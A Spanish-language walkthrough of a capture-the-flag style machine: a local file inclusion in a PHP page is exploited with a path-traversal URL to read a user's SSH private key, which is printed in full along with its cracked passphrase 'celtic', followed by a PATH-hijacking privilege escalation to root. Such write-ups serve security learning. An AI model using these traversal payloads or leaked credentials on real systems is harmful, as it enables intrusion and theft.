Hacemos el reconocimiento con nmap:
![[Pasted image 20230708123927.png]]
Vemos el puerto 80:
![[Pasted image 20230708123954.png]]
Si hacemos fuzzing nos encontramos con los directorios tools y assets:
![[Pasted image 20230708124150.png]]
![[Pasted image 20230708124136.png]]
![[Pasted image 20230708124214.png]]
Y dentro de este directorio si vemos el código fuente nos encontramos con un comentario de interés donde dicen que hay una imagen:
![[Pasted image 20230708124302.png]]
Por tanto buscamos esta imagen dentro del directorio web:
```bash
http://192.168.0.29/tools/check_if_exist.php?doc=keyboard.html
```
Y existe:
![[Pasted image 20230708124417.png]]
Probamos en hacer un local file inclusion y nos funciona:
![[Pasted image 20230708124512.png]]
Si inspeccionamos el código fuente de la página podemos ver que hay un usuario llamado gh0st:
![[Pasted image 20230708124637.png]]
Y al ver este usuario podemos tratar de adquririr el id_rsa aprovechándonos de este local file inclusion:
```bash
192.168.0.29/tools/check_if_exist.php/?doc=../../../../../../../home/g0st/.ssh/id_rsa
```
![[Pasted image 20230708124726.png]]
Copiamos todo el contenido y lo pegamos en un archivo llamado id_rsa:
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```
![[Pasted image 20230708124854.png]]
Pero nos pide un salvoconducto, por lo que tendremos que usar ssh2john:
![[Pasted image 20230708125012.png]]
Por tanto primero usamos ssh2john para obtener el hash dentro de password.txt y después crackeamos con john the ripper:
![[Pasted image 20230708125108.png]]
```bash
gh0st:celtic
```
Al poner el salvoconducto celtic ya nos funciona y estamos dentro:
![[Pasted image 20230708125141.png]]
Y ejecutando el comando sudo -l podemos ver que podemos ejecutar el script security.sh:
![[Pasted image 20230708125340.png]]
Dentro del contenido del script vemos que se ejecuta el comando tr, por lo que es posible que podamos hacer un path hijacking con tr o con grep:
![[Pasted image 20230709112805.png]]
Por tanto creamos un archivo llamado grep donde se ejecute un comando como root, el cual será cambiar los permisos a la bash:
![[Pasted image 20230709112849.png]]
Y ahora enviamos esto al path:
![[Pasted image 20230709113544.png]]
Ahora ejecutamos el script como root pasándole el PATH:
![[Pasted image 20230709113505.png]]
